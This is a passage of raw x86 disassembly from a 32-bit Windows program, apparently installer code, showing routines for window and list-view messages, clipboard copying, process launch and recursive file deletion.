  4050cc:	ff 75 0c             	push   0xc(%ebp)
  4050cf:	e8 af 0d 00 00       	call   0x405e83
  4050d4:	03 45 08             	add    0x8(%ebp),%eax
  4050d7:	3d 00 08 00 00       	cmp    $0x800,%eax
  4050dc:	73 73                	jae    0x405151
  4050de:	ff 75 0c             	push   0xc(%ebp)
  4050e1:	56                   	push   %esi
  4050e2:	e8 a2 0d 00 00       	call   0x405e89
  4050e7:	f6 45 f8 04          	testb  $0x4,-0x8(%ebp)
  4050eb:	75 0d                	jne    0x4050fa
  4050ed:	56                   	push   %esi
  4050ee:	ff 35 e8 2e 42 00    	push   0x422ee8
  4050f4:	ff 15 7c 72 40 00    	call   *0x40727c
  4050fa:	f6 45 f8 02          	testb  $0x2,-0x8(%ebp)
  4050fe:	75 44                	jne    0x405144
  405100:	53                   	push   %ebx
  405101:	53                   	push   %ebx
  405102:	68 04 10 00 00       	push   $0x1004
  405107:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  40510a:	ff 75 fc             	push   -0x4(%ebp)
  40510d:	8b 35 00 72 40 00    	mov    0x407200,%esi
  405113:	c7 45 d0 01 00 00 00 	movl   $0x1,-0x30(%ebp)
  40511a:	ff d6                	call   *%esi
  40511c:	2b c7                	sub    %edi,%eax
  40511e:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  405121:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  405124:	8d 45 d0             	lea    -0x30(%ebp),%eax
  405127:	50                   	push   %eax
  405128:	b8 07 10 00 00       	mov    $0x1007,%eax
  40512d:	2b c7                	sub    %edi,%eax
  40512f:	53                   	push   %ebx
  405130:	50                   	push   %eax
  405131:	ff 75 fc             	push   -0x4(%ebp)
  405134:	ff d6                	call   *%esi
  405136:	53                   	push   %ebx
  405137:	ff 75 d4             	push   -0x2c(%ebp)
  40513a:	68 13 10 00 00       	push   $0x1013
  40513f:	ff 75 fc             	push   -0x4(%ebp)
  405142:	ff d6                	call   *%esi
  405144:	3b fb                	cmp    %ebx,%edi
  405146:	74 09                	je     0x405151
  405148:	8b 45 08             	mov    0x8(%ebp),%eax
  40514b:	88 98 10 f5 41 00    	mov    %bl,0x41f510(%eax)
  405151:	5f                   	pop    %edi
  405152:	5e                   	pop    %esi
  405153:	5b                   	pop    %ebx
  405154:	c9                   	leave
  405155:	c2 08 00             	ret    $0x8
  405158:	56                   	push   %esi
  405159:	8b 35 48 37 42 00    	mov    0x423748,%esi
  40515f:	57                   	push   %edi
  405160:	8b 3d 4c 37 42 00    	mov    0x42374c,%edi
  405166:	6a 00                	push   $0x0
  405168:	ff 15 88 72 40 00    	call   *0x407288
  40516e:	09 05 d8 37 42 00    	or     %eax,0x4237d8
  405174:	6a 00                	push   $0x0
  405176:	e8 23 ef ff ff       	call   0x40409e
  40517b:	85 ff                	test   %edi,%edi
  40517d:	74 2b                	je     0x4051aa
  40517f:	83 c6 0c             	add    $0xc,%esi
  405182:	4f                   	dec    %edi
  405183:	f6 46 fc 01          	testb  $0x1,-0x4(%esi)
  405187:	74 0f                	je     0x405198
  405189:	ff 74 24 0c          	push   0xc(%esp)
  40518d:	ff 36                	push   (%esi)
  40518f:	e8 ff c1 ff ff       	call   0x401393
  405194:	85 c0                	test   %eax,%eax
  405196:	75 0c                	jne    0x4051a4
  405198:	81 c6 18 04 00 00    	add    $0x418,%esi
  40519e:	85 ff                	test   %edi,%edi
  4051a0:	75 e0                	jne    0x405182
  4051a2:	eb 06                	jmp    0x4051aa
  4051a4:	ff 05 ac 37 42 00    	incl   0x4237ac
  4051aa:	68 04 04 00 00       	push   $0x404
  4051af:	e8 ea ee ff ff       	call   0x40409e
  4051b4:	ff 15 84 72 40 00    	call   *0x407284
  4051ba:	a1 ac 37 42 00       	mov    0x4237ac,%eax
  4051bf:	5f                   	pop    %edi
  4051c0:	5e                   	pop    %esi
  4051c1:	c2 04 00             	ret    $0x4
  4051c4:	55                   	push   %ebp
  4051c5:	8b ec                	mov    %esp,%ebp
  4051c7:	83 ec 3c             	sub    $0x3c,%esp
  4051ca:	a1 04 2f 42 00       	mov    0x422f04,%eax
  4051cf:	53                   	push   %ebx
  4051d0:	56                   	push   %esi
  4051d1:	57                   	push   %edi
  4051d2:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4051d5:	33 db                	xor    %ebx,%ebx
  4051d7:	81 ff 10 01 00 00    	cmp    $0x110,%edi
  4051dd:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4051e0:	0f 85 89 01 00 00    	jne    0x40536f
  4051e6:	83 4d d4 ff          	orl    $0xffffffff,-0x2c(%ebp)
  4051ea:	83 4d e0 ff          	orl    $0xffffffff,-0x20(%ebp)
  4051ee:	6a 02                	push   $0x2
  4051f0:	33 c0                	xor    %eax,%eax
  4051f2:	5e                   	pop    %esi
  4051f3:	8d 7d e4             	lea    -0x1c(%ebp),%edi
  4051f6:	89 75 cc             	mov    %esi,-0x34(%ebp)
  4051f9:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  4051fc:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  4051ff:	89 5d dc             	mov    %ebx,-0x24(%ebp)
  405202:	ab                   	stos   %eax,%es:(%edi)
  405203:	ab                   	stos   %eax,%es:(%edi)
  405204:	a1 30 37 42 00       	mov    0x423730,%eax
  405209:	8b 3d 44 72 40 00    	mov    0x407244,%edi
  40520f:	68 03 04 00 00       	push   $0x403
  405214:	8b 48 5c             	mov    0x5c(%eax),%ecx
  405217:	8b 40 60             	mov    0x60(%eax),%eax
  40521a:	ff 75 08             	push   0x8(%ebp)
  40521d:	89 4d 10             	mov    %ecx,0x10(%ebp)
  405220:	89 45 0c             	mov    %eax,0xc(%ebp)
  405223:	ff d7                	call   *%edi
  405225:	68 ee 03 00 00       	push   $0x3ee
  40522a:	a3 f0 2e 42 00       	mov    %eax,0x422ef0
  40522f:	ff 75 08             	push   0x8(%ebp)
  405232:	ff d7                	call   *%edi
  405234:	68 f8 03 00 00       	push   $0x3f8
  405239:	a3 e8 2e 42 00       	mov    %eax,0x422ee8
  40523e:	ff 75 08             	push   0x8(%ebp)
  405241:	ff d7                	call   *%edi
  405243:	ff 35 f0 2e 42 00    	push   0x422ef0
  405249:	a3 04 2f 42 00       	mov    %eax,0x422f04
  40524e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405251:	e8 31 ee ff ff       	call   0x404087
  405256:	6a 04                	push   $0x4
  405258:	e8 c7 f6 ff ff       	call   0x404924
  40525d:	a3 f4 2e 42 00       	mov    %eax,0x422ef4
  405262:	8d 45 ec             	lea    -0x14(%ebp),%eax
  405265:	50                   	push   %eax
  405266:	89 1d 0c 2f 42 00    	mov    %ebx,0x422f0c
  40526c:	ff 75 fc             	push   -0x4(%ebp)
  40526f:	ff 15 0c 72 40 00    	call   *0x40720c
  405275:	56                   	push   %esi
  405276:	ff 15 d8 71 40 00    	call   *0x4071d8
  40527c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40527f:	8b 35 00 72 40 00    	mov    0x407200,%esi
  405285:	2b c8                	sub    %eax,%ecx
  405287:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40528a:	50                   	push   %eax
  40528b:	53                   	push   %ebx
  40528c:	68 1b 10 00 00       	push   $0x101b
  405291:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  405294:	ff 75 fc             	push   -0x4(%ebp)
  405297:	ff d6                	call   *%esi
  405299:	b8 00 40 00 00       	mov    $0x4000,%eax
  40529e:	50                   	push   %eax
  40529f:	50                   	push   %eax
  4052a0:	68 36 10 00 00       	push   $0x1036
  4052a5:	ff 75 fc             	push   -0x4(%ebp)
  4052a8:	ff d6                	call   *%esi
  4052aa:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  4052ad:	7c 1c                	jl     0x4052cb
  4052af:	ff 75 10             	push   0x10(%ebp)
  4052b2:	53                   	push   %ebx
  4052b3:	68 01 10 00 00       	push   $0x1001
  4052b8:	ff 75 fc             	push   -0x4(%ebp)
  4052bb:	ff d6                	call   *%esi
  4052bd:	ff 75 10             	push   0x10(%ebp)
  4052c0:	53                   	push   %ebx
  4052c1:	68 26 10 00 00       	push   $0x1026
  4052c6:	ff 75 fc             	push   -0x4(%ebp)
  4052c9:	ff d6                	call   *%esi
  4052cb:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  4052ce:	7c 0e                	jl     0x4052de
  4052d0:	ff 75 0c             	push   0xc(%ebp)
  4052d3:	53                   	push   %ebx
  4052d4:	68 24 10 00 00       	push   $0x1024
  4052d9:	ff 75 fc             	push   -0x4(%ebp)
  4052dc:	ff d6                	call   *%esi
  4052de:	8b 45 14             	mov    0x14(%ebp),%eax
  4052e1:	ff 70 30             	push   0x30(%eax)
  4052e4:	6a 1b                	push   $0x1b
  4052e6:	ff 75 08             	push   0x8(%ebp)
  4052e9:	e8 64 ed ff ff       	call   0x404052
  4052ee:	f6 05 38 37 42 00 03 	testb  $0x3,0x423738
  4052f5:	74 34                	je     0x40532b
  4052f7:	53                   	push   %ebx
  4052f8:	ff 35 f0 2e 42 00    	push   0x422ef0
  4052fe:	ff 15 78 72 40 00    	call   *0x407278
  405304:	f6 05 38 37 42 00 02 	testb  $0x2,0x423738
  40530b:	75 0d                	jne    0x40531a
  40530d:	6a 08                	push   $0x8
  40530f:	ff 75 fc             	push   -0x4(%ebp)
  405312:	ff 15 78 72 40 00    	call   *0x407278
  405318:	eb 06                	jmp    0x405320
  40531a:	89 1d f0 2e 42 00    	mov    %ebx,0x422ef0
  405320:	ff 35 e8 2e 42 00    	push   0x422ee8
  405326:	e8 5c ed ff ff       	call   0x404087
  40532b:	68 ec 03 00 00       	push   $0x3ec
  405330:	ff 75 08             	push   0x8(%ebp)
  405333:	ff d7                	call   *%edi
  405335:	68 00 00 30 75       	push   $0x75300000
  40533a:	8b f8                	mov    %eax,%edi
  40533c:	53                   	push   %ebx
  40533d:	68 01 04 00 00       	push   $0x401
  405342:	57                   	push   %edi
  405343:	ff d6                	call   *%esi
  405345:	f6 05 38 37 42 00 04 	testb  $0x4,0x423738
  40534c:	0f 84 f3 01 00 00    	je     0x405545
  405352:	ff 75 0c             	push   0xc(%ebp)
  405355:	53                   	push   %ebx
  405356:	68 09 04 00 00       	push   $0x409
  40535b:	57                   	push   %edi
  40535c:	ff d6                	call   *%esi
  40535e:	ff 75 10             	push   0x10(%ebp)
  405361:	53                   	push   %ebx
  405362:	68 01 20 00 00       	push   $0x2001
  405367:	57                   	push   %edi
  405368:	ff d6                	call   *%esi
  40536a:	e9 d6 01 00 00       	jmp    0x405545
  40536f:	81 ff 05 04 00 00    	cmp    $0x405,%edi
  405375:	75 28                	jne    0x40539f
  405377:	8d 45 0c             	lea    0xc(%ebp),%eax
  40537a:	50                   	push   %eax
  40537b:	53                   	push   %ebx
  40537c:	68 ec 03 00 00       	push   $0x3ec
  405381:	ff 75 08             	push   0x8(%ebp)
  405384:	ff 15 44 72 40 00    	call   *0x407244
  40538a:	50                   	push   %eax
  40538b:	68 4e 51 40 00       	push   $0x40514e
  405390:	53                   	push   %ebx
  405391:	53                   	push   %ebx
  405392:	ff 15 c4 70 40 00    	call   *0x4070c4
  405398:	50                   	push   %eax
  405399:	ff 15 f4 70 40 00    	call   *0x4070f4
  40539f:	8b 35 78 72 40 00    	mov    0x407278,%esi
  4053a5:	81 ff 11 01 00 00    	cmp    $0x111,%edi
  4053ab:	75 20                	jne    0x4053cd
  4053ad:	66 81 7d 10 03 04    	cmpw   $0x403,0x10(%ebp)
  4053b3:	75 39                	jne    0x4053ee
  4053b5:	53                   	push   %ebx
  4053b6:	ff 35 f0 2e 42 00    	push   0x422ef0
  4053bc:	ff d6                	call   *%esi
  4053be:	6a 08                	push   $0x8
  4053c0:	ff 75 fc             	push   -0x4(%ebp)
  4053c3:	ff d6                	call   *%esi
  4053c5:	ff 75 fc             	push   -0x4(%ebp)
  4053c8:	e8 ba ec ff ff       	call   0x404087
  4053cd:	81 ff 04 04 00 00    	cmp    $0x404,%edi
  4053d3:	75 53                	jne    0x405428
  4053d5:	39 1d ec 2e 42 00    	cmp    %ebx,0x422eec
  4053db:	74 24                	je     0x405401
  4053dd:	6a 78                	push   $0x78
  4053df:	c7 05 00 f1 41 00 02 	movl   $0x2,0x41f100
  4053e6:	00 00 00 
  4053e9:	e8 3d ec ff ff       	call   0x40402b
  4053ee:	ff 75 14             	push   0x14(%ebp)
  4053f1:	ff 75 10             	push   0x10(%ebp)
  4053f4:	57                   	push   %edi
  4053f5:	e8 bf ec ff ff       	call   0x4040b9
  4053fa:	5f                   	pop    %edi
  4053fb:	5e                   	pop    %esi
  4053fc:	5b                   	pop    %ebx
  4053fd:	c9                   	leave
  4053fe:	c2 10 00             	ret    $0x10
  405401:	6a 08                	push   $0x8
  405403:	ff 35 28 37 42 00    	push   0x423728
  405409:	ff d6                	call   *%esi
  40540b:	39 1d ac 37 42 00    	cmp    %ebx,0x4237ac
  405411:	75 0e                	jne    0x405421
  405413:	a1 08 f5 41 00       	mov    0x41f508,%eax
  405418:	53                   	push   %ebx
  405419:	ff 70 34             	push   0x34(%eax)
  40541c:	e8 65 fc ff ff       	call   0x405086
  405421:	6a 01                	push   $0x1
  405423:	e8 03 ec ff ff       	call   0x40402b
  405428:	83 ff 7b             	cmp    $0x7b,%edi
  40542b:	75 c1                	jne    0x4053ee
  40542d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405430:	39 45 10             	cmp    %eax,0x10(%ebp)
  405433:	75 b9                	jne    0x4053ee
  405435:	53                   	push   %ebx
  405436:	53                   	push   %ebx
  405437:	68 04 10 00 00       	push   $0x1004
  40543c:	50                   	push   %eax
  40543d:	ff 15 00 72 40 00    	call   *0x407200
  405443:	3b c3                	cmp    %ebx,%eax
  405445:	89 45 10             	mov    %eax,0x10(%ebp)
  405448:	0f 8e f7 00 00 00    	jle    0x405545
  40544e:	ff 15 d4 71 40 00    	call   *0x4071d4
  405454:	6a e1                	push   $0xffffffe1
  405456:	53                   	push   %ebx
  405457:	8b f0                	mov    %eax,%esi
  405459:	e8 31 0a 00 00       	call   0x405e8f
  40545e:	50                   	push   %eax
  40545f:	6a 01                	push   $0x1
  405461:	53                   	push   %ebx
  405462:	56                   	push   %esi
  405463:	ff 15 68 72 40 00    	call   *0x407268
  405469:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40546c:	0f bf 45 14          	movswl 0x14(%ebp),%eax
  405470:	c1 e9 10             	shr    $0x10,%ecx
  405473:	83 7d 14 ff          	cmpl   $0xffffffff,0x14(%ebp)
  405477:	0f bf c9             	movswl %cx,%ecx
  40547a:	75 13                	jne    0x40548f
  40547c:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40547f:	50                   	push   %eax
  405480:	ff 75 fc             	push   -0x4(%ebp)
  405483:	ff 15 cc 71 40 00    	call   *0x4071cc
  405489:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40548c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40548f:	53                   	push   %ebx
  405490:	ff 75 08             	push   0x8(%ebp)
  405493:	53                   	push   %ebx
  405494:	51                   	push   %ecx
  405495:	50                   	push   %eax
  405496:	68 80 01 00 00       	push   $0x180
  40549b:	56                   	push   %esi
  40549c:	ff 15 64 72 40 00    	call   *0x407264
  4054a2:	83 f8 01             	cmp    $0x1,%eax
  4054a5:	0f 85 9a 00 00 00    	jne    0x405545
  4054ab:	8b 45 10             	mov    0x10(%ebp),%eax
  4054ae:	33 f6                	xor    %esi,%esi
  4054b0:	46                   	inc    %esi
  4054b1:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  4054b4:	c7 45 d8 30 fd 41 00 	movl   $0x41fd30,-0x28(%ebp)
  4054bb:	c7 45 dc 00 10 00 00 	movl   $0x1000,-0x24(%ebp)
  4054c2:	89 45 08             	mov    %eax,0x8(%ebp)
  4054c5:	bf 2d 10 00 00       	mov    $0x102d,%edi
  4054ca:	ff 4d 08             	decl   0x8(%ebp)
  4054cd:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4054d0:	50                   	push   %eax
  4054d1:	ff 75 08             	push   0x8(%ebp)
  4054d4:	57                   	push   %edi
  4054d5:	ff 75 fc             	push   -0x4(%ebp)
  4054d8:	ff 15 00 72 40 00    	call   *0x407200
  4054de:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4054e1:	8d 74 06 02          	lea    0x2(%esi,%eax,1),%esi
  4054e5:	75 e3                	jne    0x4054ca
  4054e7:	53                   	push   %ebx
  4054e8:	ff 15 60 72 40 00    	call   *0x407260
  4054ee:	ff 15 c4 71 40 00    	call   *0x4071c4
  4054f4:	56                   	push   %esi
  4054f5:	6a 42                	push   $0x42
  4054f7:	ff 15 60 71 40 00    	call   *0x407160
  4054fd:	50                   	push   %eax
  4054fe:	89 45 08             	mov    %eax,0x8(%ebp)
  405501:	ff 15 c0 70 40 00    	call   *0x4070c0
  405507:	8b f0                	mov    %eax,%esi
  405509:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  40550c:	89 75 d8             	mov    %esi,-0x28(%ebp)
  40550f:	50                   	push   %eax
  405510:	53                   	push   %ebx
  405511:	57                   	push   %edi
  405512:	ff 75 fc             	push   -0x4(%ebp)
  405515:	ff 15 00 72 40 00    	call   *0x407200
  40551b:	03 f0                	add    %eax,%esi
  40551d:	c6 06 0d             	movb   $0xd,(%esi)
  405520:	46                   	inc    %esi
  405521:	c6 06 0a             	movb   $0xa,(%esi)
  405524:	46                   	inc    %esi
  405525:	43                   	inc    %ebx
  405526:	3b 5d 10             	cmp    0x10(%ebp),%ebx
  405529:	7c de                	jl     0x405509
  40552b:	ff 75 08             	push   0x8(%ebp)
  40552e:	ff 15 bc 70 40 00    	call   *0x4070bc
  405534:	ff 75 08             	push   0x8(%ebp)
  405537:	6a 01                	push   $0x1
  405539:	ff 15 c0 71 40 00    	call   *0x4071c0
  40553f:	ff 15 bc 71 40 00    	call   *0x4071bc
  405545:	33 c0                	xor    %eax,%eax
  405547:	e9 ae fe ff ff       	jmp    0x4053fa
  40554c:	55                   	push   %ebp
  40554d:	8b ec                	mov    %esp,%ebp
  40554f:	83 ec 20             	sub    $0x20,%esp
  405552:	b8 74 73 40 00       	mov    $0x407374,%eax
  405557:	80 65 e1 00          	andb   $0x0,-0x1f(%ebp)
  40555b:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40555e:	89 45 e8             	mov    %eax,-0x18(%ebp)
  405561:	8d 45 e0             	lea    -0x20(%ebp),%eax
  405564:	83 65 ec 00          	andl   $0x0,-0x14(%ebp)
  405568:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40556c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40556f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405572:	56                   	push   %esi
  405573:	50                   	push   %eax
  405574:	c6 45 e0 01          	movb   $0x1,-0x20(%ebp)
  405578:	ff 75 08             	push   0x8(%ebp)
  40557b:	66 c7 45 e2 04 00    	movw   $0x4,-0x1e(%ebp)
  405581:	c7 45 f0 64 73 40 00 	movl   $0x407364,-0x10(%ebp)
  405588:	c7 45 f4 0c 00 00 00 	movl   $0xc,-0xc(%ebp)
  40558f:	ff 15 cc 70 40 00    	call   *0x4070cc
  405595:	85 c0                	test   %eax,%eax
  405597:	74 04                	je     0x40559d
  405599:	33 c0                	xor    %eax,%eax
  40559b:	eb 27                	jmp    0x4055c4
  40559d:	8b 35 c8 70 40 00    	mov    0x4070c8,%esi
  4055a3:	ff d6                	call   *%esi
  4055a5:	3d b7 00 00 00       	cmp    $0xb7,%eax
  4055aa:	75 18                	jne    0x4055c4
  4055ac:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4055af:	50                   	push   %eax
  4055b0:	68 07 00 00 80       	push   $0x80000007
  4055b5:	ff 75 08             	push   0x8(%ebp)
  4055b8:	ff 15 04 70 40 00    	call   *0x407004
  4055be:	85 c0                	test   %eax,%eax
  4055c0:	75 d7                	jne    0x405599
  4055c2:	ff d6                	call   *%esi
  4055c4:	5e                   	pop    %esi
  4055c5:	c9                   	leave
  4055c6:	c2 04 00             	ret    $0x4
  4055c9:	6a 00                	push   $0x0
  4055cb:	ff 74 24 08          	push   0x8(%esp)
  4055cf:	ff 15 cc 70 40 00    	call   *0x4070cc
  4055d5:	85 c0                	test   %eax,%eax
  4055d7:	74 04                	je     0x4055dd
  4055d9:	33 c0                	xor    %eax,%eax
  4055db:	eb 06                	jmp    0x4055e3
  4055dd:	ff 15 c8 70 40 00    	call   *0x4070c8
  4055e3:	c2 04 00             	ret    $0x4
  4055e6:	6a 05                	push   $0x5
  4055e8:	e8 19 0c 00 00       	call   0x406206
  4055ed:	85 c0                	test   %eax,%eax
  4055ef:	74 0a                	je     0x4055fb
  4055f1:	ff d0                	call   *%eax
  4055f3:	85 c0                	test   %eax,%eax
  4055f5:	74 04                	je     0x4055fb
  4055f7:	33 c0                	xor    %eax,%eax
  4055f9:	40                   	inc    %eax
  4055fa:	c3                   	ret
  4055fb:	33 c0                	xor    %eax,%eax
  4055fd:	c3                   	ret
  4055fe:	55                   	push   %ebp
  4055ff:	8b ec                	mov    %esp,%ebp
  405601:	83 ec 10             	sub    $0x10,%esp
  405604:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405607:	c7 05 38 15 42 00 44 	movl   $0x44,0x421538
  40560e:	00 00 00 
  405611:	50                   	push   %eax
  405612:	33 c0                	xor    %eax,%eax
  405614:	68 38 15 42 00       	push   $0x421538
  405619:	50                   	push   %eax
  40561a:	50                   	push   %eax
  40561b:	68 00 00 00 04       	push   $0x4000000
  405620:	50                   	push   %eax
  405621:	50                   	push   %eax
  405622:	50                   	push   %eax
  405623:	ff 75 08             	push   0x8(%ebp)
  405626:	50                   	push   %eax
  405627:	ff 15 d0 70 40 00    	call   *0x4070d0
  40562d:	85 c0                	test   %eax,%eax
  40562f:	74 0c                	je     0x40563d
  405631:	ff 75 f4             	push   -0xc(%ebp)
  405634:	ff 15 f4 70 40 00    	call   *0x4070f4
  40563a:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40563d:	c9                   	leave
  40563e:	c2 04 00             	ret    $0x4
  405641:	ff 25 dc 71 40 00    	jmp    *0x4071dc
  405647:	68 00 04 00 00       	push   $0x400
  40564c:	ff 74 24 0c          	push   0xc(%esp)
  405650:	ff 74 24 0c          	push   0xc(%esp)
  405654:	ff 35 f8 2e 42 00    	push   0x422ef8
  40565a:	ff 15 e0 71 40 00    	call   *0x4071e0
  405660:	c2 08 00             	ret    $0x8
  405663:	8b 44 24 08          	mov    0x8(%esp),%eax
  405667:	8b c8                	mov    %eax,%ecx
  405669:	81 e1 ff ff 1f 00    	and    $0x1fffff,%ecx
  40566f:	83 3d c0 37 42 00 00 	cmpl   $0x0,0x4237c0
  405676:	74 05                	je     0x40567d
  405678:	c1 e8 15             	shr    $0x15,%eax
  40567b:	75 47                	jne    0x4056c4
  40567d:	83 3d c8 37 42 00 00 	cmpl   $0x0,0x4237c8
  405684:	74 06                	je     0x40568c
  405686:	81 f1 00 00 18 00    	xor    $0x180000,%ecx
  40568c:	a1 28 37 42 00       	mov    0x423728,%eax
  405691:	68 30 92 40 00       	push   $0x409230
  405696:	a3 34 92 40 00       	mov    %eax,0x409234
  40569b:	a1 20 37 42 00       	mov    0x423720,%eax
  4056a0:	a3 38 92 40 00       	mov    %eax,0x409238
  4056a5:	8b 44 24 08          	mov    0x8(%esp),%eax
  4056a9:	a3 3c 92 40 00       	mov    %eax,0x40923c
  4056ae:	c7 05 40 92 40 00 20 	movl   $0x422f20,0x409240
  4056b5:	2f 42 00 
  4056b8:	89 0d 44 92 40 00    	mov    %ecx,0x409244
  4056be:	ff 15 e4 71 40 00    	call   *0x4071e4
  4056c4:	c2 08 00             	ret    $0x8
  4056c7:	56                   	push   %esi
  4056c8:	8b 74 24 08          	mov    0x8(%esp),%esi
  4056cc:	57                   	push   %edi
  4056cd:	56                   	push   %esi
  4056ce:	e8 e8 03 00 00       	call   0x405abb
  4056d3:	8b f8                	mov    %eax,%edi
  4056d5:	83 ff ff             	cmp    $0xffffffff,%edi
  4056d8:	74 2e                	je     0x405708
  4056da:	f6 44 24 10 01       	testb  $0x1,0x10(%esp)
  4056df:	56                   	push   %esi
  4056e0:	74 08                	je     0x4056ea
  4056e2:	ff 15 d4 70 40 00    	call   *0x4070d4
  4056e8:	eb 06                	jmp    0x4056f0
  4056ea:	ff 15 30 71 40 00    	call   *0x407130
  4056f0:	85 c0                	test   %eax,%eax
  4056f2:	74 05                	je     0x4056f9
  4056f4:	33 c0                	xor    %eax,%eax
  4056f6:	40                   	inc    %eax
  4056f7:	eb 11                	jmp    0x40570a
  4056f9:	f6 44 24 10 04       	testb  $0x4,0x10(%esp)
  4056fe:	75 08                	jne    0x405708
  405700:	57                   	push   %edi
  405701:	56                   	push   %esi
  405702:	ff 15 90 70 40 00    	call   *0x407090
  405708:	33 c0                	xor    %eax,%eax
  40570a:	5f                   	pop    %edi
  40570b:	5e                   	pop    %esi
  40570c:	c2 08 00             	ret    $0x8
  40570f:	55                   	push   %ebp
  405710:	8b ec                	mov    %esp,%ebp
  405712:	81 ec 4c 01 00 00    	sub    $0x14c,%esp
  405718:	53                   	push   %ebx
  405719:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40571c:	56                   	push   %esi
  40571d:	57                   	push   %edi
  40571e:	8b 7d 08             	mov    0x8(%ebp),%edi
  405721:	8b c3                	mov    %ebx,%eax
  405723:	83 e0 04             	and    $0x4,%eax
  405726:	57                   	push   %edi
  405727:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40572a:	e8 9e 02 00 00       	call   0x4059cd
  40572f:	f6 c3 08             	test   $0x8,%bl
  405732:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405735:	74 17                	je     0x40574e
  405737:	57                   	push   %edi
  405738:	ff 15 30 71 40 00    	call   *0x407130
  40573e:	f7 d8                	neg    %eax
  405740:	1b c0                	sbb    %eax,%eax
  405742:	40                   	inc    %eax
  405743:	01 05 a8 37 42 00    	add    %eax,0x4237a8
  405749:	e9 8a 01 00 00       	jmp    0x4058d8
  40574e:	89 5d 08             	mov    %ebx,0x8(%ebp)
  405751:	83 65 08 01          	andl   $0x1,0x8(%ebp)
  405755:	74 11                	je     0x405768
  405757:	85 c0                	test   %eax,%eax
  405759:	0f 84 27 01 00 00    	je     0x405886
  40575f:	f6 c3 02             	test   $0x2,%bl
  405762:	0f 84 1e 01 00 00    	je     0x405886
  405768:	be 38 0d 42 00       	mov    $0x420d38,%esi
  40576d:	57                   	push   %edi
  40576e:	56                   	push   %esi
  40576f:	e8 f9 06 00 00       	call   0x405e6d
  405774:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405778:	74 0d                	je     0x405787
  40577a:	68 bc 93 40 00       	push   $0x4093bc
  40577f:	56                   	push   %esi
  405780:	e8 04 07 00 00       	call   0x405e89
  405785:	eb 06                	jmp    0x40578d
  405787:	57                   	push   %edi
  405788:	e8 99 01 00 00       	call   0x405926
  40578d:	80 3f 00             	cmpb   $0x0,(%edi)
  405790:	75 09                	jne    0x40579b
  405792:	80 3d 38 0d 42 00 5c 	cmpb   $0x5c,0x420d38
  405799:	75 0b                	jne    0x4057a6
  40579b:	68 14 90 40 00       	push   $0x409014
  4057a0:	57                   	push   %edi
  4057a1:	e8 e3 06 00 00       	call   0x405e89
  4057a6:	57                   	push   %edi
  4057a7:	e8 d7 06 00 00       	call   0x405e83
  4057ac:	8b d8                	mov    %eax,%ebx
  4057ae:	8d 85 b4 fe ff ff    	lea    -0x14c(%ebp),%eax
  4057b4:	50                   	push   %eax
  4057b5:	56                   	push   %esi
  4057b6:	03 df                	add    %edi,%ebx
  4057b8:	ff 15 28 71 40 00    	call   *0x407128
  4057be:	83 f8 ff             	cmp    $0xffffffff,%eax
  4057c1:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4057c4:	0f 84 b2 00 00 00    	je     0x40587c
  4057ca:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  4057d0:	6a 3f                	push   $0x3f
  4057d2:	50                   	push   %eax
  4057d3:	8d b5 e0 fe ff ff    	lea    -0x120(%ebp),%esi
  4057d9:	e8 2c 01 00 00       	call   0x40590a
  4057de:	80 38 00             	cmpb   $0x0,(%eax)
  4057e1:	74 09                	je     0x4057ec
  4057e3:	80 7d e4 00          	cmpb   $0x0,-0x1c(%ebp)
  4057e7:	74 03                	je     0x4057ec
  4057e9:	8d 75 e4             	lea    -0x1c(%ebp),%esi
  4057ec:	80 3e 2e             	cmpb   $0x2e,(%esi)
  4057ef:	75 11                	jne    0x405802
  4057f1:	8a 46 01             	mov    0x1(%esi),%al
  4057f4:	84 c0                	test   %al,%al
  4057f6:	74 63                	je     0x40585b
  4057f8:	3c 2e                	cmp    $0x2e,%al
  4057fa:	75 06                	jne    0x405802
  4057fc:	80 7e 02 00          	cmpb   $0x0,0x2(%esi)
  405800:	74 59                	je     0x40585b
  405802:	56                   	push   %esi
  405803:	53                   	push   %ebx
  405804:	e8 64 06 00 00       	call   0x405e6d
  405809:	f6 85 b4 fe ff ff 10 	testb  $0x10,-0x14c(%ebp)
  405810:	74 15                	je     0x405827
  405812:	8b 45 0c             	mov    0xc(%ebp),%eax
  405815:	83 e0 03             	and    $0x3,%eax
  405818:	3c 03                	cmp    $0x3,%al
  40581a:	75 3f                	jne    0x40585b
  40581c:	ff 75 0c             	push   0xc(%ebp)
  40581f:	57                   	push   %edi
  405820:	e8 ea fe ff ff       	call   0x40570f
  405825:	eb 34                	jmp    0x40585b
  405827:	ff 75 fc             	push   -0x4(%ebp)
  40582a:	57                   	push   %edi
